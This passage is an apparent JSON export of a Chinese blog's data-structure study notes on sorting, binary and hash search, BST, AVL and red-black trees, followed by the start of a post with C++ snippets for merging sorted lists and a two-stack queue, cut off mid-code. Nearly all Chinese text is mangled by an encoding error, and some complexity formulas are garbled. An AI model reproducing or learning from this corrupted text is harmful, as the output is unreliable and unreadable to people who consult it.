**åº”ç”¨**ï¼šæ±‚é€†åºå¯¹æ•°é‡ ã€‚\n\n### åˆ†é…æ’åº\nä¸åŸºäºâ€œæ¯”è¾ƒ-ç§»åŠ¨â€çš„æ’åºæ–¹å¼ã€‚\n#### è®¡æ•°æ’åº\n- - **å‡è®¾**ï¼šè¾“å…¥å…ƒç´ æ˜¯ 0 åˆ° k ä¹‹é—´çš„ä¸€ä¸ªæ•´æ•° ã€‚ Â \n    - **åŸºæœ¬æ€æƒ³**ï¼šç»Ÿè®¡æ¯ä¸ªå…ƒç´ å‡ºç°çš„æ¬¡æ•°ï¼Œç„¶åæ ¹æ®è®¡æ•°ç¡®å®šæ¯ä¸ªå…ƒç´ åœ¨è¾“å‡ºæ•°ç»„ä¸­çš„ä½ç½® ã€‚ Â \n    - **æ€§èƒ½**ï¼š\n        - æ—¶é—´å¤æ‚åº¦ï¼šO(n+k)ï¼Œå½“ k ä¸º O(n) æ—¶ï¼Œå¤æ‚åº¦ä¸º O(n) ã€‚ Â \n        - ç©ºé—´å¤æ‚åº¦ï¼šO(n+k) ã€‚ Â \n\n#### æ¡¶æ’åº\n- - **åŸºæœ¬æ€æƒ³**ï¼šå°†å…ƒç´ åˆ†é…åˆ°æœ‰é™æ•°é‡çš„æ¡¶ä¸­ï¼Œç„¶åå¯¹æ¯ä¸ªæ¡¶å†…çš„å…ƒç´ è¿›è¡Œæ’åºï¼ˆé€šå¸¸ç”¨æ’å…¥æ’åºï¼‰ï¼Œæœ€åä¾æ¬¡è¿æ¥å„æ¡¶ä¸­çš„å…ƒç´ å¾—åˆ°æœ‰åºåºåˆ— ã€‚ \n    - **ä¸è®¡æ•°æ’åºå…³ç³»**ï¼šè®¡æ•°æ’åºå¯ä»¥çœ‹ä½œæ˜¯æ¡¶æ’åºçš„ä¸€ç§ç‰¹æ®Šæƒ…å†µï¼Œå…¶ä¸­æ¯ä¸ªæ¡¶åªåŒ…å«ç›¸åŒå€¼çš„å…ƒç´  ã€‚ Â \n    - **æ€§èƒ½**ï¼š\n        - æ—¶é—´å¤æ‚åº¦ï¼šå¹³å‡ O(n+kn2â€‹+k) (å‡è®¾å‡åŒ€åˆ†é…åˆ°kä¸ªæ¡¶)ï¼Œå¦‚æœå…ƒç´ èƒ½å‡åŒ€åˆ†é…ï¼Œå¯ä»¥è¾¾åˆ° O(n) ã€‚æœ€å O(n2) ã€‚ Â \n        - ç©ºé—´å¤æ‚åº¦ï¼šO(n+k) ã€‚ Â \n\n#### åŸºæ•°æ’åº\n- **æ ¸å¿ƒæ€è·¯**ï¼šå°†å¾…æ’åºå…ƒç´ çœ‹ä½œåŸºäºåŸºæ•°ï¼ˆå¦‚åè¿›åˆ¶çš„10ï¼‰çš„å…ƒç»„è¡¨ç¤ºï¼Œç„¶åä»æœ€ä½ä½ï¼ˆLSDï¼‰æˆ–æœ€é«˜ä½ï¼ˆMSDï¼‰å¼€å§‹ï¼Œå¯¹æ¯ä¸€ä½è¿›è¡Œæ’åºï¼ˆé€šå¸¸ä½¿ç”¨è®¡æ•°æ’åºä½œä¸ºå­æ’åºç®—æ³•ï¼‰ ã€‚ Â \n    ![image.png](https://pic.moyuin.top/2025/05/13/68230a0966517.png)\n\n- **åˆ†ç±»**ï¼š\n    - **æœ€ä½ä½ä¼˜å…ˆ (LSD) åŸºæ•°æ’åº** ï¼šä»æœ€ä½ä½åˆ°æœ€é«˜ä½ï¼Œé€ä½è¿›è¡Œç¨³å®šæ’åºã€‚ Â \n    - **æœ€é«˜ä½ä¼˜å…ˆ (MSD) åŸºæ•°æ’åº** ï¼šä»æœ€é«˜ä½å¼€å§‹ï¼Œé€’å½’åœ°å¯¹å­åºåˆ—è¿›è¡Œæ’åºã€‚ Â \n        \n- **æ€§èƒ½** (è®¾nä¸ªå…ƒç´ ï¼Œæ¯ä¸ªå…ƒç´ æœ‰dä½ï¼ŒåŸºæ•°ä¸ºk)ï¼š\n    - LSDæ—¶é—´å¤æ‚åº¦ï¼šO(d(n+k)) ã€‚ Â \n    - MSDæ—¶é—´å¤æ‚åº¦ï¼šæœ€å O(dâ‹…nâ‹…k)ï¼Œå¹³å‡ä¹Ÿç±»ä¼¼ ã€‚ Â \n    - ç©ºé—´å¤æ‚åº¦ï¼šO(n+k) ã€‚ Â \n\t\n### ç´¢å¼•æ’åº\n- **æ ¸å¿ƒæ€è·¯**ï¼šåˆ›å»ºä¸€ä¸ªç´¢å¼•åºåˆ—ï¼Œæ’åºæ—¶ä¸ç›´æ¥ç§»åŠ¨åŸåºåˆ—ä¸­çš„å…ƒç´ ï¼Œè€Œæ˜¯ç§»åŠ¨ç´¢å¼•ã€‚æ’åºå®Œæˆåï¼Œç´¢å¼•åºåˆ—æŒ‡æ˜äº†åŸåºåˆ—å…ƒç´ åº”æœ‰çš„é¡ºåºã€‚è¿™åœ¨å…ƒç´ ç§»åŠ¨å’Œæ‹·è´ä»£ä»·å¾ˆå¤§æ—¶éå¸¸æœ‰ç”¨ ã€‚ Â  \n- **å…ƒç´ é¡ºåºè°ƒæ•´**ï¼šå¾—åˆ°æ’åºåçš„ç´¢å¼•åºåˆ—åï¼Œå¯ä»¥æ ¹æ®ç´¢å¼•å°†åŸåºåˆ—å…ƒç´ è°ƒæ•´åˆ°æ­£ç¡®ä½ç½®ã€‚\n\n![ ](https://pic.moyuin.top/2025/05/12/68219fdb8c19f.png)\n\n---\n# æ•°æ®ç»“æ„-æŸ¥æ‰¾\n## åŸºæœ¬æŸ¥æ‰¾ç®—æ³•\n### é¡ºåºæŸ¥æ‰¾\nä¸€ä¸ªä¸€ä¸ªæŸ¥ï¼ŒO(n)\n\n### äºŒåˆ†æŸ¥æ‰¾\nä¸­ä½ middle=`(low+high)/2`\nlow å’Œ high è¦éšæ—¶æ”¹æˆ middle+1 (å»å³è¾¹æ‰¾)æˆ–è€… middle-1 ï¼ˆå»å·¦è¾¹æ‰¾ï¼‰\næ—¶é—´å¤æ‚åº¦ O(logn)\n\n---\n### ç´¢å¼•æŸ¥æ‰¾ï¼ˆåˆ†å—æŸ¥æ‰¾ï¼‰\n- åˆ›å»ºå­˜å‚¨æ•°æ®çš„è¡¨ï¼Œå†æ ¹æ®è¦æ±‚å»ºç«‹ç›¸åº”ç´¢å¼•\nï¼ˆå¦‚åˆ›å»ºå­—å…¸ç›®å½•ï¼Œæœ‰ç‚¹åƒ unordered_map å»ºç«‹æ˜ å°„ï¼‰\n- ç´¢å¼•æŸ¥æ‰¾éœ€è¦ç‰ºç‰²ç©ºé—´ï¼Œä»è€Œé™ä½æ—¶é—´å¤æ‚åº¦\n#### å¦‚ä½•æ„å»ºç´¢å¼•ï¼Ÿ\n- è¡¨ä¸­æ•°æ®åˆ†å—ï¼Œä½¿å¾—å†…éƒ¨åˆ†å—çš„å…³é”®å­—å€¼éƒ½å¤§äºæˆ–å°äºä¸‹ä¸€ä¸ªå—ã€‚ç§°ä¸ºâ€œåˆ†å—æœ‰åºâ€ã€‚\n- ä¸ºæ¯å—å»ºç«‹ä¸€ä¸ªç´¢å¼•é¡¹ï¼ŒåŒ…å« `key` å’Œ `index` ã€‚å³å…³é”®ç å­—æ®µå’ŒæŒ‡é’ˆå­—æ®µã€‚\n- é€šè¿‡`key` æ‰¾åˆ°å…³é”®å­—å€¼çš„è®°å½•å—ï¼Œç„¶ååœ¨å—å†…è¿›è¡Œ **é¡ºåºæŸ¥æ‰¾æˆ–è€…äºŒåˆ†æŸ¥æ‰¾**\n\t![ ](https://pic.moyuin.top/2025/05/06/681972101597a.png)\n\nå…¶å®æ—¶é—´å¤æ‚åº¦ä¹Ÿæ˜¯çº¿æ€§ï¼Œä½†æ˜¯ä¾èµ–äºå—æ•°æ®çš„å¤§å°ä¸å—å†…æŸ¥æ‰¾æ–¹å¼ã€‚\n![ ](https://pic.moyuin.top/2025/05/06/681972634d44b.png)\n- O(s)ä¸O(logs)çš„æŸ¥æ‰¾æ—¶é—´ï¼Œè¿˜å¾—çœ‹åˆ†å—çš„å¤§å°ã€‚\n\n---\n## äºŒå‰æŸ¥æ‰¾æ ‘ ï¼ˆBSTï¼‰\n### åŸºæœ¬å®šä¹‰\näºŒå‰æŸ¥æ‰¾æ ‘æˆ–è€…æ˜¯ä¸€æ£µç©ºæ ‘ï¼›\næˆ–è€…æ˜¯å…·æœ‰å¦‚ä¸‹ç‰¹æ€§çš„äºŒå‰æ ‘ï¼š \n- è‹¥æ ¹ç»“ç‚¹çš„å·¦å­æ ‘ä¸ç©ºï¼Œåˆ™å·¦å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å°äºæ ¹ç»“ç‚¹çš„å€¼ï¼›\n- è‹¥æ ¹ç»“ç‚¹çš„å³å­æ ‘ä¸ç©ºï¼Œåˆ™å³å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å¤§äºæ ¹ç»“ç‚¹çš„å€¼ï¼›\næ€§è´¨ï¼š**ä»»ä½•äºŒå‰æŸ¥æ‰¾æ ‘çš„ä¸­åºéå†éƒ½æ˜¯æœ‰åºåºåˆ—**\nä¸”ä¸€èˆ¬è§„å¾‹æ˜¯: ä»»æ„å·¦å­æ ‘çš„å€¼ < æ ¹èŠ‚ç‚¹çš„å€¼ < å¯¹åº”å³å­æ ‘çš„å€¼ã€‚\n![ ](https://pic.moyuin.top/2025/05/06/6819743c74b9c.png)\n\n### æŸ¥æ‰¾\nå¦‚æœè¦åœ¨äºŒå‰æŸ¥æ‰¾æ ‘å¯»æ‰¾å…³é”®å€¼ `key` ,åŸºæœ¬åŸç†å’ŒäºŒåˆ†æŸ¥æ‰¾ç›¸åŒã€‚å¦‚æœç»™å®šå€¼æ¯”å½“å‰èŠ‚ç‚¹å°åˆ™å»å½“å‰èŠ‚ç‚¹çš„å·¦å­æ ‘ç»§ç»­å¯»æ‰¾ï¼Œå¤§åˆ™å»å³å­æ ‘ç»§ç»­å¯»æ‰¾ã€‚\n![ ](https://pic.moyuin.top/2025/05/06/6819755227c8c.png)\n\næ—¶é—´å¤æ‚åº¦ä¸º O(h),hä¸ºæ ‘çš„é«˜åº¦ã€‚åŸºæœ¬ä¹Ÿå°±æ˜¯è¿›è¡Œé€’å½’è°ƒç”¨ã€‚\n\nå¯¹äºå…¶æ—¶é—´å¤æ‚åº¦ï¼Œæ€§èƒ½æœ€å·®å¯èƒ½ä¼šé€€åŒ–åˆ°çº¿æ€§æŸ¥æ‰¾ã€‚\n![ ](https://pic.moyuin.top/2025/05/06/68197f1c9f9d9.png)\n![ ](https://pic.moyuin.top/2025/05/06/68197f320c789.png)\n\n\n### äºŒå‰æ ‘æ’å…¥ç®—æ³•\næ³¨æ„ï¼š**æ’å…¥ä½ç½®æ˜¯èŠ‚ç‚¹ä»æ ¹èŠ‚ç‚¹æ¯”è¾ƒä¸€æ­¥ä¸€æ­¥ç¡®å®šçš„ï¼Œå°äºè¯¥èŠ‚ç‚¹ç§»åˆ°å·¦ä¾§ä¸å·¦èŠ‚ç‚¹æ¯”è¾ƒï¼Œåä¹‹åŒç†ï¼Œä¸æ˜¯éšä¾¿å†™çš„ã€‚**\nä¹Ÿæ˜¯åˆ©ç”¨æŸ¥æ‰¾ï¼Œç¡®å®šå¥½è¦è¿›å…¥çš„æ ‘èŠ‚ç‚¹ï¼Œä»è€Œæ’å…¥å€¼ã€‚\n**â€œæ’å…¥â€æ“ä½œåœ¨æŸ¥æ‰¾ä¸æˆåŠŸæ—¶æ‰è¿›è¡Œ**ã€‚å¦‚æœæ ‘ä¸­å­˜åœ¨è¯¥å€¼ï¼ŒBST ä¸å…è®¸æœ‰é‡å¤å€¼ã€‚\n![ ](https://pic.moyuin.top/2025/05/06/6819771990a1b.png)\n\n### äºŒå‰æŸ¥æ‰¾æ ‘çš„å»ºç«‹\nå°†æ ¹èŠ‚ç‚¹è®¾ç½®ä¸ºä¸€ä¸ªç©ºé›†ï¼ˆå˜æˆå¯ä»¥è®¾å®šä¸ºä¸€ä¸ªæ— é™å°ï¼‰ï¼Œç„¶åå¾€ä¸‹æŸ¥æ‰¾å¾€ä¸‹ç”»å³å¯ã€‚\n\n### äºŒå‰æŸ¥æ‰¾æ ‘çš„åˆ é™¤\nåˆ é™¤å¯åˆ†ä¸‰ç§æƒ…å†µè®¨è®ºï¼š \nï¼ˆ1ï¼‰è¢«åˆ é™¤çš„ç»“ç‚¹æ˜¯å¶å­ ï¼Œä¸ç”¨ç®¡å­©å­ï¼Œå¾ˆç®€å•\n![ ](https://pic.moyuin.top/2025/05/06/68197c6df26f8.png)\n\nï¼ˆ2ï¼‰è¢«åˆ é™¤çš„ç»“ç‚¹åªæœ‰å·¦å­æ ‘æˆ–è€…åªæœ‰å³å­æ ‘ ï¼Œåƒé“¾è¡¨ä¸€æ ·éœ€è¦åˆ é™¤èŠ‚ç‚¹çš„æ“ä½œ\n![ ](https://pic.moyuin.top/2025/05/06/68197c8725d4c.png)\n\nï¼ˆ3ï¼‰è¢«åˆ é™¤çš„ç»“ç‚¹æ—¢æœ‰å·¦å­æ ‘ï¼Œä¹Ÿæœ‰å³å­æ ‘ã€‚è¿™ä¸ªæ¯”è¾ƒå¤æ‚ï¼Œä¸å †çš„é‚£ä¸ªæ“ä½œä¸å¤ªä¸€æ ·ã€‚\nç›¸å½“äºåœ¨åºåˆ—é‡Œå°†å…¶å¾€å‰ç§»åŠ¨ä¸€æ ¼ï¼Œæ‹¼èµ·æ¥ã€‚\n![ ](https://pic.moyuin.top/2025/05/06/68197ca755bb7.png)\n\n## å¹³è¡¡äºŒå‰æ ‘ï¼ˆAVLæ ‘ï¼‰\n### åŸºæœ¬å®šä¹‰\nAVLæ ‘æˆ–è€…æ˜¯ä¸€æ£µç©ºæ ‘ï¼Œæˆ–è€…æ˜¯å…·æœ‰ä¸‹åˆ—æ€§è´¨çš„äºŒå‰æŸ¥æ‰¾æ ‘ï¼š \n- å·¦ã€å³å­æ ‘éƒ½æ˜¯å¹³è¡¡äºŒå‰æ ‘ï¼› \n- å·¦ã€å³å­æ ‘çš„é«˜åº¦å·®ç»å¯¹å€¼ä¸è¶…è¿‡1ã€‚ï¼ˆè¿™é‡Œçš„é«˜åº¦å·®å·¦å­æ ‘é«˜åº¦-å³å­æ ‘é«˜åº¦ï¼‰\n![ ](https://pic.moyuin.top/2025/05/06/6819815d362ff.png)\n\n### æ„é€ AVLæ ‘\nçœ‹ä¸ªä¾‹å­ã€‚æ‰€è°“**å¹³è¡¡æ—‹è½¬**ï¼Œå·¦æ—‹å’Œå³æ—‹ï¼Œå°±æ˜¯ï¼š\n> **å³æ—‹ = å·¦å­è¿‡é‡æ—¶ï¼ŒæŠŠå·¦å„¿å­æä¸Šæ¥å½“æ–°æ ¹ï¼ŒæŠŠåŸæ ¹æ”¾åˆ°å³è¾¹ï¼›å·¦å„¿å­çš„å³å­ï¼ˆå¦‚æœæœ‰ï¼‰ä¼šå˜æˆåŸæ ¹çš„å·¦å­ã€‚**\n\n> **å·¦æ—‹ = å³å­è¿‡é‡æ—¶ï¼ŒæŠŠå³å„¿å­æä¸Šæ¥å½“æ–°æ ¹ï¼ŒæŠŠåŸæ ¹æ”¾åˆ°å·¦è¾¹ï¼›å³å„¿å­çš„å·¦å­ï¼ˆå¦‚æœæœ‰ï¼‰ä¼šå˜æˆåŸæ ¹çš„å³å­ã€‚**\n\n![ ](https://pic.moyuin.top/2025/05/06/681981a599c96.png)\n![ ](https://pic.moyuin.top/2025/05/06/6819822c4d942.png)\n\n### å°†BSTè½¬åŒ–ä¸ºAVL\n![ ](https://pic.moyuin.top/2025/05/06/6819847d7e3d3.png)\n#### å¹³è¡¡åŒ–æ—‹è½¬\n![ ](https://pic.moyuin.top/2025/05/06/681984a26bbb9.png)\n\n#### å¤±è¡¡è°ƒæ•´æ—‹è½¬å¹³è¡¡å¤„ç†\n- ç¬¬ä¸€ä¸ªå­—æ¯ä»£è¡¨ï¼š**å¤±è¡¡èŠ‚ç‚¹æ˜¯å“ªä¸ªå­æ ‘é«˜äº†**ï¼ˆL = å·¦å­æ ‘ï¼ŒR = å³å­æ ‘ï¼‰\n- ç¬¬äºŒä¸ªå­—æ¯ä»£è¡¨ï¼š**å“ªè¾¹æ’å…¥å¯¼è‡´äº†è¿™ä¸ªå­æ ‘å˜é«˜**ï¼ˆL = å·¦è¾¹æ’å…¥ï¼ŒR = å³è¾¹æ’å…¥ï¼‰\nå›¾ä¾‹\n- å•è°ƒå³æ—‹ ï¼ˆLLï¼‰\n\t![ ](https://pic.moyuin.top/2025/05/13/6822a9dc26338.png)\n\n- å•è°ƒå·¦æ—‹ï¼ˆRRï¼‰\n\t![ ](https://pic.moyuin.top/2025/05/13/6822aa0aa6af7.png)\n\n- å…ˆå·¦åå³æ—‹ ï¼ˆLRï¼‰\n\t![ ](https://pic.moyuin.top/2025/05/13/6822aa1910657.png)\n\n- å…ˆå³åå·¦æ—‹è½¬ï¼ˆRLï¼‰\n\t![ ](https://pic.moyuin.top/2025/05/13/6822aa29095e7.png)\n\n### æ’å…¥\nAVLæ ‘çš„æ–°ç»“ç‚¹çš„æ’å…¥è¿‡ç¨‹åŒ…æ‹¬ä¸¤ä¸ªæ­¥éª¤ï¼š\n- ç»“ç‚¹æ’å…¥ï¼š æŒ‰ç…§BSTæ„å»ºæ–¹æ³•æ’å…¥ï¼ŒåŒæ—¶æ›´æ–°å¹³è¡¡å› å­\n- å¹³è¡¡åŒ–ï¼šå¦‚æœæ’å…¥è¿‡ç¨‹ä¸­å‡ºç°ä¸å¹³è¡¡ï¼Œé‡‡ç”¨**å¹³è¡¡åŒ–è°ƒæ•´**ï¼Œä»¥ä¿æŒAVLçš„æ€§è´¨\n\næ’å…¥æœ‰ä¸€ä¸ªé€’å½’ç®—æ³•ï¼Œå¤ªé•¿äº†...\n\n### åˆ é™¤\n![image.png](https://pic.moyuin.top/2025/05/13/6822b48508436.png)\n\n---\n\n##  æ•£åˆ—æŸ¥æ‰¾ | å“ˆå¸ŒæŸ¥æ‰¾\nå»ºç«‹æ˜ å°„ï¼Œ`unordered_map`çš„ä¼Ÿå¤§æ— éœ€å¤šè¨€ã€‚\næ•£åˆ—æŸ¥æ‰¾éœ€è¦å»ºç«‹æŸç§å“ˆå¸Œå‡½æ•°ï¼Œé€šè¿‡æŸç§æ•°å­¦æ–¹æ³•å°†æ•°æ®è½¬åŒ–ä¸ºå“ˆå¸Œåœ°å€ï¼Œå»ºç«‹ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œæ˜ å°„å»ºç«‹ã€‚\n**ç”±äºå“ˆå¸Œå‡½æ•°æ˜¯ä¸€ä¸ªå‹ç¼©æ˜ å°„**ï¼Œå› æ­¤åœ¨ä¸€èˆ¬æƒ…å†µä¸‹**å®¹æ˜“äº§ç”Ÿå†²çª**ï¼Œé¿å…å†²çªï¼Œè¦ä¹ˆå°±å“ˆå¸Œåœ°å€æ›´å¤æ‚ï¼Œè¦ä¹ˆå°±å“ˆå¸Œå‡½æ•°æ›´å¤æ‚ã€‚\n\n> å¾ˆéš¾æ‰¾åˆ°ä¸€ä¸ªä¸äº§ç”Ÿå†²çªçš„æ•£åˆ—å‡½æ•°ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåªèƒ½é€‰æ‹©æ°å½“çš„æ•£åˆ—å‡½æ•°ï¼Œä½¿å†²çªå°½å¯èƒ½å°‘åœ°äº§ç”Ÿã€‚\n\n### æ•£åˆ—å‡½æ•° | å“ˆå¸Œå‡½æ•°\nä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªå¥½çš„æ•£åˆ—å‡½æ•°åº”æ»¡è¶³ä¸‹åˆ—ä¸¤ä¸ªæ¡ä»¶ï¼š \n- è®¡ç®—ç®€å• \n- å†²çªå°‘\n\nå¸¸è§çš„å“ˆå¸Œå‡½æ•°æ„é€ æ–¹æ³•æœ‰ï¼š\n- ç›´æ¥åœ°å€å­˜å‚¨æ³• \n- æ•°å­—åˆ†ææ³•\n- å¹³æ–¹å–ä¸­æ³• \n- æŠ˜å æ³• \n- é™¤ç•™ä½™æ•°æ³• \n- éšæœºæ•°æ³•\n\n#### ç›´æ¥åœ°å€å­˜å‚¨æ³•\n![image.png](https://pic.moyuin.top/2025/05/13/6822ba1cd89c6.png)\n\n\n#### æ•°å­—åˆ†ææ³•\n![image.png](https://pic.moyuin.top/2025/05/13/6822ba49733cc.png)\n\n#### å¹³æ–¹å–ä¸­æ³•\n![image.png](https://pic.moyuin.top/2025/05/13/6822ba5da25cd.png)\n\nå¹³æ–¹å–ä¸­æ³•æ€æƒ³ï¼š**ä»¥å…³é”®å­—çš„å¹³æ–¹å€¼çš„ä¸­é—´å‡ ä½ä½œä¸ºå­˜å‚¨åœ°å€ã€‚**\nå…³é”®å­—çš„å„ä½éƒ½åœ¨å¹³æ–¹å€¼çš„ä¸­é—´å‡ ä½æœ‰æ‰€è´¡çŒ®ï¼ŒHash å€¼ä¸­åº”è¯¥æœ‰å„ä½å½±å­ã€‚\n\n#### æŠ˜å æ³•\n![image.png](https://pic.moyuin.top/2025/05/13/6822bad72914b.png)\n\n#### é™¤ç•™ä½™æ•°æ³•\n![image.png](https://pic.moyuin.top/2025/05/13/6822bb08893b4.png)\n\n#### éšæœºæ•°æ³•\næ³¨æ„éšæœºä¸€å®šè¦çœŸéšæœºï¼Œè®¾ç½®å¥½ seed éšæœºç§å­ã€‚\n\n![image.png](https://pic.moyuin.top/2025/05/13/6822bb403f316.png)\n\næ•£åˆ—è¡¨çš„ç»˜åˆ¶ä¹‹åè¡¥å……ã€‚\n\n## çº¢é»‘æ ‘\n### çº¢é»‘æ ‘çš„äº”æ¡æ ¸å¿ƒè§„åˆ™\n\n1. æ¯ä¸ªèŠ‚ç‚¹è¦ä¹ˆæ˜¯**çº¢è‰²**ï¼Œè¦ä¹ˆæ˜¯**é»‘è‰²**ã€‚\n2. æ ¹èŠ‚ç‚¹æ°¸è¿œæ˜¯**é»‘è‰²**ã€‚\n3. æ‰€æœ‰å¶å­èŠ‚ç‚¹ï¼ˆNIL/ç©ºèŠ‚ç‚¹ï¼‰éƒ½æ˜¯**é»‘è‰²**çš„ã€‚\n4. **çº¢è‰²**èŠ‚ç‚¹çš„å­èŠ‚ç‚¹å¿…é¡»æ˜¯**é»‘è‰²**çš„ã€‚ï¼ˆå³ä¸èƒ½æœ‰ä¸¤ä¸ªè¿ç»­çš„çº¢è‰²èŠ‚ç‚¹ï¼‰\n5. ä»ä»»ä¸€èŠ‚ç‚¹åˆ°å…¶æ‰€æœ‰åä»£å¶å­èŠ‚ç‚¹çš„è·¯å¾„ä¸Šï¼Œ**é»‘è‰²**èŠ‚ç‚¹çš„æ•°é‡éƒ½ç›¸åŒã€‚\n\n**æ’å…¥ç­–ç•¥**ï¼šæ–°æ’å…¥çš„èŠ‚ç‚¹**æ€»æ˜¯çº¢è‰²**çš„ã€‚ç„¶åé€šè¿‡â€œå˜è‰²â€å’Œâ€œæ—‹è½¬â€æ¥ä¿®å¤å¯èƒ½è¿åçš„è§„åˆ™ã€‚\n\n### ä¿®å¤è¿è§„çš„â€œå°æŠ„â€\n\nå½“ä½ æ’å…¥ä¸€ä¸ª**çº¢è‰²**æ–°èŠ‚ç‚¹ `N`ï¼Œå‘ç°å®ƒçš„çˆ¶èŠ‚ç‚¹ `P` ä¹Ÿæ˜¯**çº¢è‰²**æ—¶ï¼ˆè¿åäº†è§„åˆ™4ï¼‰ï¼Œä½ åªéœ€è¦çœ‹å®ƒ**å”å”èŠ‚ç‚¹ `U` çš„é¢œè‰²**ï¼š\n\n- **æƒ…å†µ1ï¼šå”å” `U` æ˜¯çº¢è‰²**\n    - **æ“ä½œ**ï¼š**å˜è‰²**ã€‚å°†çˆ¶èŠ‚ç‚¹ `P` å’Œå”å” `U` å˜ä¸º**é»‘è‰²**ï¼Œå°†ç¥–çˆ¶èŠ‚ç‚¹ `G` å˜ä¸º**çº¢è‰²**ã€‚ç„¶åå°†ç¥–çˆ¶èŠ‚ç‚¹ `G` å½“ä½œæ–°çš„æ’å…¥ç‚¹ï¼Œç»§ç»­å‘ä¸Šæ£€æŸ¥ã€‚\n- **æƒ…å†µ2ï¼šå”å” `U` æ˜¯é»‘è‰²ï¼ˆæˆ–NIL/ç©ºèŠ‚ç‚¹ï¼‰**\n    - **æ“ä½œ**ï¼š**æ—‹è½¬+å˜è‰²**ã€‚è¿™åˆåˆ†ä¸ºä¸¤ç§ï¼š\n        - **ç›´çº¿å‹ (LL / RR)**ï¼šç›´æ¥å¯¹ç¥–çˆ¶èŠ‚ç‚¹ `G` è¿›è¡Œæ—‹è½¬ï¼Œç„¶åå°† `P` å’Œ `G` å˜è‰²ã€‚\n        - **ä¸‰è§’å‹ (LR / RL)**ï¼šå…ˆå¯¹çˆ¶èŠ‚ç‚¹ `P` è¿›è¡Œæ—‹è½¬ï¼Œå˜æˆç›´çº¿å‹ï¼Œç„¶åå†æŒ‰ç›´çº¿å‹å¤„ç†ã€‚\n","tags":["å­¦ä¹ ","æ•°æ®ç»“æ„","ç¼–ç¨‹"],"categories":["æ—¥å¸¸å­¦ä¹ ","æ•°æ®ç»“æ„"]},{"title":"æ•°æ®ç»“æ„-ç»å…¸ç®—æ³•è®¾è®¡ï¼ˆæœŸä¸­å¤‡è€ƒç”¨ï¼‰","url":"/2025/04/14/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-jing-dian-suan-fa-she-ji-qi-zhong-bei-kao-yong/","content":"# æ•°æ®ç»“æ„-ç»å…¸ç®—æ³•è®¾è®¡ï¼ˆæœŸä¸­å¤‡è€ƒç”¨ï¼‰\n\næ¯ä¸ªç®—æ³•éƒ½æœ‰ç®€å•çš„æ€è·¯ï¼Œä½†å¹¶éç®—æ³•æ€æƒ³ï¼Œåªæ˜¯è®°å½•ä¸€äº›ç»å…¸çš„ç®—æ³•è®¾è®¡ã€‚\n\n---\n## 1. åˆå¹¶ä¸¤ä¸ªæœ‰åºé“¾è¡¨\n### é¢˜ç›®æè¿°\nå†™ä¸€ä¸ªå‡½æ•°ï¼Œå°†ä¸¤ä¸ªå‡åºé“¾è¡¨åˆå¹¶æˆä¸€ä¸ªæ–°çš„å‡åºé“¾è¡¨ï¼Œè¿”å›æ–°é“¾è¡¨çš„å¤´æŒ‡é’ˆã€‚\n### ç®—æ³•æ­¥éª¤\n1. åˆ›å»ºä¸€ä¸ªç»“ç‚¹ dummyï¼ˆå¤´æŒ‡é’ˆå ä½ï¼‰ã€‚\n2. ä½¿ç”¨ä¸€ä¸ªæŒ‡é’ˆ `tail` æŒ‡å‘åˆå¹¶é“¾è¡¨çš„æœ«å°¾ã€‚\n3. æ¯æ¬¡æ¯”è¾ƒä¸¤ä¸ªé“¾è¡¨å½“å‰èŠ‚ç‚¹çš„å€¼ï¼Œå°†è¾ƒå°çš„ä¸€ä¸ªé“¾æ¥åˆ° `tail`ã€‚\n4. å°† `tail` å‘åç§»åŠ¨ï¼Œæºé“¾è¡¨æŒ‡é’ˆä¹Ÿå‰è¿›ã€‚\n5. å½“ä¸€ä¸ªé“¾è¡¨èµ°å®Œåï¼Œå°†å¦ä¸€ä¸ªé“¾è¡¨å‰©ä½™éƒ¨åˆ†ç›´æ¥æ¥åˆ° `tail` åé¢ã€‚\n```cpp\nstruct ListNode {\n    int val;\n    ListNode* next;\n    ListNode(int x) : val(x), next(nullptr) {}\n};\n//ç»“æ„ä½“æ„å»ºï¼Œå¯å†™å¯ä¸å†™ï¼Œæœ€é‡è¦çš„æ˜¯ä¸‹é¢çš„è¿™ä¸ªç®—æ³•å‡½æ•°ã€‚\n\n\nListNode* merge(ListNode* l1, ListNode* l2) {\n    ListNode dummy(0), *tail = &dummy;\n    while (l1 && l2) {\n        if (l1->val < l2->val) tail->next = l1, l1 = l1->next;\n        else tail->next = l2, l2 = l2->next;\n        tail = tail->next;\n    }\n    tail->next = l1 ? l1 : l2;\n    return dummy.next;\n}\n```\n\næ—¶é—´å¤æ‚åº¦ï¼š`O(m + n)`ï¼Œm å’Œ n æ˜¯ä¸¤ä¸ªé“¾è¡¨çš„é•¿åº¦\nç©ºé—´å¤æ‚åº¦ï¼š`O(1)`ï¼ˆåŸåœ°åˆå¹¶ï¼Œä¸å¼€é¢å¤–æ•°ç»„ï¼‰\n\n---\n## 2. ç”¨æ ˆå®ç°é˜Ÿåˆ—\n### é¢˜ç›®æè¿°\nä½¿ç”¨ä¸¤ä¸ªæ ˆå®ç°ä¸€ä¸ªé˜Ÿåˆ—çš„å…¥é˜Ÿå’Œå‡ºé˜Ÿæ“ä½œã€‚\n\n### ç®—æ³•æ­¥éª¤\nç”¨ä¸¤ä¸ªæ ˆ `in` å’Œ `out`ï¼š\n- å…¥é˜Ÿæ—¶ç›´æ¥å‹å…¥ `in`\n- å‡ºé˜Ÿæ—¶ï¼š\n    - è‹¥ `out` éç©ºï¼Œç›´æ¥å¼¹å‡º\n    - è‹¥ `out` ä¸ºç©ºï¼Œå°† `in` æ‰€æœ‰å…ƒç´ å€’å…¥ `out`ï¼Œå†å¼¹å‡º\n```cpp\nclass MyQueue {\nprivate:\n    stack<int> inStack, outStack;\n\n    void transfer() {\n        while (!inStack.empty()) {\n            outStack.push(inStack.top()); //æŠŠå…¥æ ˆå€’å…¥å‡ºæ ˆ\n            inStack.pop();\n        }\n    }\n\npublic:\n//è¿™é‡Œå…¶å®ä¹Ÿåªè¦å†™pushå’Œpopå‡½æ•°ï¼Œè®°å¾—æŠŠtransferå‡½æ•°å¥—åˆ°popé‡Œå³å¯ã€‚\n    void push(int x) {\n        inStack.push(x);\n    }//å‹å…¥é˜Ÿåˆ—\n\n    void pop() {\n        if (outStack.empty()) transfer();\n        if 